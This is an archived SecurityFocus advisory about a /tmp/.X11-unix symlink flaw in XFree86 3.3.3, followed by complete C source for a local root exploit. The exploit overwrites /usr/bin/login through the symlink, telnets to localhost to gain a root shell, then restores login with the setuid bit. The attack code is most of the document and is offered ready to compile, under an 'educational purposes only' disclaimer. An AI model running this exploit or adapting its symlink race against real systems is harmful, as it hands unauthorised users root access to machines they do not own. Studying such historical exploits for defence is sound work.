source: http://www.securityfocus.com/bid/326/info

There is a symlink vulnerability known to exist under most modern linux and NetBSD distributions. It involves /tmp/.X11-unix and the tendency to follow to/overwrite the file pointed to if a symlink. It may be possible for a regular user to write arbritrary data to a file they normally have no write access to resulting in a root compromise. 

/*** local XFree 3.3.3-symlink  root-compromise.
 *** Tested under FreeBSD 3.1 (but should work on others 2)
 *** (C) 1999/2000 by Stealthf0rk for the K.A.L.U.G. 
 *** (check out http://www.kalug.lug.net/stealth or /coding for
 ***  other kewl stuff!)
 ***
 *** FOR EDUCATIONAL PURPOSES ONLY!!! USE IT AT YOUR OWN RISK.
 *** Even if this program restores all, you should backup your
 *** login before running this.
 ***/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>

#define LOGIN "/usr/bin/login"
#define TELNET "/usr/bin/telnet"

int cp(const char*, const char*, int);

int main(int argc, char **argv)
{

	char *telnet[] = {TELNET, "localhost", NULL};
	char *shell[] = {"/bin/sh", NULL};
	char *X[] = {"/usr/X11R6/bin/xinit", NULL};
	FILE *f = NULL;
	int p = 0;
	char buf[1000] = {0};

	/* the rootshell */
	if (!geteuid() || !getuid()) {
		unlink(LOGIN);
		cp("/tmp/L", LOGIN, 1);
		chmod(LOGIN, 04555);
		printf("Welcome!\n");
		unlink("/tmp/.X11-unix");
		unlink("/tmp/L");
		execve(*shell, shell, NULL);
	}
	
	/* back up */
	cp(LOGIN, "/tmp/L", 1);
	if (symlink(LOGIN, "/tmp/.X11-unix") < 0) {
		perror("symlink (/tmp/.X11-unix)");
		exit(errno);
	}
	if ((p = fork()) < 0) {
		perror("fork");
		exit(errno);
	} else if (p > 0) {
		sleep(7);
		kill(p, 9);
		cp(argv[0], LOGIN, 1);
		execve(telnet[0], telnet, NULL);
		perror("fatal:");
	} else {
		printf("Xfree 3.3.3 root-sploit by Stealth. http://www.kalug.lug.net\n");
		printf("\n-> Please give me some seconds... <-\n\n");
		execve(X[0], X, NULL);
	}
	return 0;
}
	
	
int cp(const char *from, const char *to, int how)
{
	int in = 0, out = 0, r = 0;
	char buf[1000] = {0};
	

	printf("cp %s %s\n", from, to);
	/* overwrite ? */
	if (how == 1) 
		how = O_RDWR|O_TRUNC|O_CREAT;
	else
		how = O_RDWR|O_CREAT;

        if ((out = open(to, how)) < 0) {
		perror("open 1");
		exit(errno);
	}
	if ((in = open(from, O_RDONLY)) < 0) {
		perror("open 2");
		exit(errno);
	}
	while ((r = read(in, buf, 1000-1)) > 0) {
		write(out,buf,r);
		memset(buf,0,1000);
	}
	close(in); close(out);
	return 0;
}